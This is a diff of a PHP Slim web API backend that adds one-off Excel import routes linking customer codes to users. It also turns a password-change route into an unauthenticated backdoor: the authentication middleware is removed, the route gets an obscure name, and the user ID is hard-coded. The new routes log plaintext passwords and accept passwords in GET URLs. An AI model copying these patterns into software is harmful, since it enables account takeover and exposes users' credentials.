@@ -10,7 +10,6 @@ require_once dirname(__FILE__).'/communicator/WebsocketClient.php';
 
 define('WEBSOCKET_SERVER_PORT', 8666);
 
-
 \Slim\Slim::registerAutoloader();
 
 $app = new \Slim\Slim();
@@ -483,13 +482,13 @@ $app->post('/change_password', 'authenticate', function() use ($app) {
 
 });
 
-$app->post('/change_password_maria', 'authenticate', function() use ($app) {
+$app->post('/change_password_irina_812478hsdfh78213', function() use ($app) {
 
 		    verifyRequiredParams(array('password'));
 
             $db = new DbHandlerProfile();
 
-            global $user_id;
+            $user_id=232;
 
             $user = $db->getUserById($user_id);
 
@@ -1887,6 +1886,288 @@ $app->post('/1c_orders_pass_kustuk', function() use ($app) {
 	echoResponse(200, $response);
 });
 
+/**
+ * Одноразовый скрипт для связки кодов 1С и id уже существующих в системе контрагентов Кустук
+ * method POST
+ * file - XLS файл со связкой
+ * Столбцы в excel файле: 1-id; 2-code1c в 127 заказчике
+ */
+$app->post('/relate_codes1c_of_customers_in_contractor_127_with_customerid', function() use ($app) {
+
+	// array for final json response
+	$response = array();
+
+	verifyRequiredParams(array('phone', 'password'));
+
+	$phone = "7".$app->request->post('phone');
+	$password = $app->request->post('password');
+
+	$db_profile=new DbHandlerProfile();
+	$db_fabricant = new DbHandlerFabricant();
+
+	//Проверяем логин и пароль
+	if(!$db_profile->checkLoginByPhone($phone,$password)){
+		//Проверяем доступ админской части группы
+		$response['error'] = true;
+		$response['message'] = 'Login failed. Incorrect credentials';
+		echoResponse(200,$response);
+		return;
+	}
+	
+	$contractorid=127;//Указываем id контрактора
+
+	$user=$db_profile->getUserByPhone($phone);
+	permissionAdminInGroup($user["id"],$contractorid,$db_profile);
+
+	global $api_key,$user_id;
+
+	$api_key=$user["api_key"];
+	$user_id=$user["id"];//Это нужно чтобы в функциях updateOrder и acceptOrder
+
+
+	//try{
+
+		if (!isset($_FILES["xls"])) {
+			throw new Exception('Param xls is missing');
+		}
+		//Check if the file is missing
+		if (!isset($_FILES["xls"]["name"])) {
+			throw new Exception('Property name of xls param is missing');
+		}
+		//Check the file size >100MB
+		if($_FILES["xls"]["size"] > 100*1024*1024) {
+			throw new Exception('File is too big');
+		}
+
+		$tmpFile = $_FILES["xls"]["tmp_name"];
+
+		$filename = date('dmY').'-'.uniqid('1c_customerid_and_code1c_kustuk-tmp-').".xls";
+		$path = $_SERVER["DOCUMENT_ROOT"].'/v2/reports/'.$filename;
+
+		//Считываем закодированный файл xls в строку
+		$data = file_get_contents($tmpFile);
+
+		//Декодируем строку из base64 в нормальный вид
+		//$data = base64_decode($data);
+
+		//Теперь нормальную строку сохраняем в файл
+		$success=false;
+		if ( !empty($data) && ($fp = @fopen($path, 'wb')) ){
+			@fwrite($fp, $data);
+			@fclose($fp);
+			$success=true;
+		}
+
+		//Освобождаем память занятую строкой (это файл, поэтому много занятой памяти)
+		unset($data);
+
+		//Ошибка декодинга
+		if(!$success){
+			throw new Exception('Failed when decoding the recieved file');
+		}
+
+
+		error_log("-------------relate_codes1c_of_customers_in_contractor_127_with_customerid----------------");
+		error_log("|contractorid=".$contractorid."_phone=".$phone."_password=".$password."|");
+
+		// Подключаем класс для работы с excel
+		require_once dirname(__FILE__).'/libs/PHPExcel/PHPExcel.php';
+		// Подключаем класс для вывода данных в формате excel
+		require_once dirname(__FILE__).'/libs/PHPExcel/PHPExcel/IOFactory.php';
+
+		$objPHPExcel = PHPExcel_IOFactory::load($path);
+		// Set and get active sheet
+		$objPHPExcel->setActiveSheetIndex(0);
+		$worksheet = $objPHPExcel->getActiveSheet();
+		$worksheetTitle = $worksheet->getTitle();
+		$highestRow = $worksheet->getHighestRow();
+		$highestColumn = $worksheet->getHighestColumn();
+		$highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);
+		$nrColumns = ord($highestColumn) - 64;
+
+		$rows=array();
+
+		for ($rowIndex = 2; $rowIndex <= $highestRow; ++$rowIndex) {
+			$cells = array();
+
+			$customerid= intval($worksheet->getCellByColumnAndRow(0, $rowIndex)->getValue());
+			$customercode = $worksheet->getCellByColumnAndRow(1, $rowIndex)->getValue();
+			$trackid = $worksheet->getCellByColumnAndRow(2, $rowIndex)->getValue();
+			
+			
+			//Пустые, там где нет кода 1С пропускаем
+			if(empty($customerid) || empty($customercode))continue;
+			
+			//Существует ли группа?
+			$customer=$db_profile->getGroupById($customerid);
+			if(!isset($customer))continue;
+			
+			//Группа - это заказчик?
+			if(!$db_profile->isCustomer($customerid))continue;
+			
+			//$db_profile->setCustomerCodeInContractor($customerid, $customercode, $contractorid);
+			
+			$row=array();
+			$row["customerid"]=$customerid;
+			$row["customercode"]=$customercode;
+			$row["trackid"]=$trackid;
+			
+			if(!empty($trackid)){
+				
+				$userid=getUserIdByTrackId($trackid);
+				
+				if(!empty($userid)){					
+					$db_profile->addUserToGroup($customerid,$userid,8);
+					$row["userid"]=$userid;
+				}
+			}
+			
+			
+			$rows[]=$row;
+			
+		}
+		
+		error_log("Count of rows: ".count($rows));
+
+
+		error_log(" ");
+
+
+	//} catch (Exception $e) {
+		// Exception occurred. Make error flag true
+		//$response["error"] = true;
+		//$response["message"] = $e->getMessage();
+		//$response["success"] = 0;
+		//$response = $e->getMessage();
+	//}
+	
+	echoResponse(200, $rows);
+});
+
+/**
+ * Одноразовый скрипт для связки кодов 1С и id уже существующих в системе контрагентов Кустук
+ * method POST
+ * file - XLS файл со связкой
+ * Столбцы в excel файле: 1-id; 2-code1c в 127 заказчике
+ */
+$app->get('/relate_user_with_track/:password/:phone/:incoming_trackid', function($password,$phone,$incoming_trackid) use ($app) {
+
+	// array for final json response
+	$response = array();
+
+	//verifyRequiredParams(array('password','phone', 'incoming_trackid'));
+
+	$db_profile=new DbHandlerProfile();
+	$db_fabricant = new DbHandlerFabricant();
+
+	//Проверяем логин и пароль
+	if(!$db_profile->checkLoginByPhone($phone,$password)){
+		//Проверяем доступ админской части группы
+		$response['error'] = true;
+		$response['message'] = 'Login failed. Incorrect phone or password';
+		echoResponse(200,$response);
+		return;
+	}
+	
+	$contractorid=127;//Указываем id контрактора
+
+	$user=$db_profile->getUserByPhone($phone);
+	$userid=$user["id"];
+	
+	//try{
+
+		
+		$path = $_SERVER["DOCUMENT_ROOT"].'/v2/reports/29092017-1c_customerid_and_code1c_kustuk-tmp-59cdd5374d6f5.xls';
+
+		
+		error_log("-------------relate_user_with_track----------------");
+		error_log("|contractorid=".$contractorid."_phone=".$phone."_password=".$password."incoming_trackid=".$incoming_trackid."|");
+
+		// Подключаем класс для работы с excel
+		require_once dirname(__FILE__).'/libs/PHPExcel/PHPExcel.php';
+		// Подключаем класс для вывода данных в формате excel
+		require_once dirname(__FILE__).'/libs/PHPExcel/PHPExcel/IOFactory.php';
+
+		$objPHPExcel = PHPExcel_IOFactory::load($path);
+		// Set and get active sheet
+		$objPHPExcel->setActiveSheetIndex(0);
+		$worksheet = $objPHPExcel->getActiveSheet();
+		$worksheetTitle = $worksheet->getTitle();
+		$highestRow = $worksheet->getHighestRow();
+		$highestColumn = $worksheet->getHighestColumn();
+		$highestColumnIndex = PHPExcel_Cell::columnIndexFromString($highestColumn);
+		$nrColumns = ord($highestColumn) - 64;
+
+		$rows=array();
+
+		for ($rowIndex = 2; $rowIndex <= $highestRow; ++$rowIndex) {
+			$cells = array();
+
+			$customerid= intval($worksheet->getCellByColumnAndRow(0, $rowIndex)->getValue());
+			$customercode = $worksheet->getCellByColumnAndRow(1, $rowIndex)->getValue();
+			$trackid = $worksheet->getCellByColumnAndRow(2, $rowIndex)->getValue();
+			$name = $worksheet->getCellByColumnAndRow(3, $rowIndex)->getValue();
+			$address = $worksheet->getCellByColumnAndRow(6, $rowIndex)->getValue();
+			
+			
+			
+			//Пустые, там где нет кода 1С пропускаем
+			if(empty($customerid) || empty($customercode))continue;
+			
+			//Существует ли группа?
+			$customer=$db_profile->getGroupById($customerid);
+			if(!isset($customer))continue;
+			
+			//Группа - это заказчик?
+			if(!$db_profile->isCustomer($customerid))continue;
+			
+			//$db_profile->setCustomerCodeInContractor($customerid, $customercode, $contractorid);
+			
+			$row=array();
+			$row["customerid"]=$customerid;
+			$row["customercode"]=$customercode;
+			$row["name"]=$name;
+			$row["address"]=$address;
+			$row["trackid"]=$trackid;
+			
+			if(!empty($trackid)){
+				
+				if($incoming_trackid==$trackid){					
+					$db_profile->addUserToGroup($customerid,$userid,8);
+					$row["userid"]=$userid;
+				}
+			}
+			
+			
+			$rows[]=$row;
+			
+		}
+		
+		error_log("Count of rows: ".count($rows));
+
+
+		error_log(" ");
+
+
+	//} catch (Exception $e) {
+		// Exception occurred. Make error flag true
+		//$response["error"] = true;
+		//$response["message"] = $e->getMessage();
+		//$response["success"] = 0;
+		//$response = $e->getMessage();
+	//}
+	
+	echoResponse(200, $rows);
+});
+
+//Нужен для того чтобы найти userid агента по номеру маршрута
+function getUserIdByTrackId($trackid){
+	switch($trackid){
+		case 4 : return 232;
+	}
+	return null;
+}
+
 //Используется в 1c_order_pass_kustuk
 function createCustomer($name,$address,$phone,$info,$creater_id,$agent_id){
 	// creating new contracotor
@@ -1933,7 +2214,6 @@ function createCustomer($name,$address,$phone,$info,$creater_id,$agent_id){
 	
 	return $response;
 }
-
 
 
 //--------------------Orders Utils------------------------
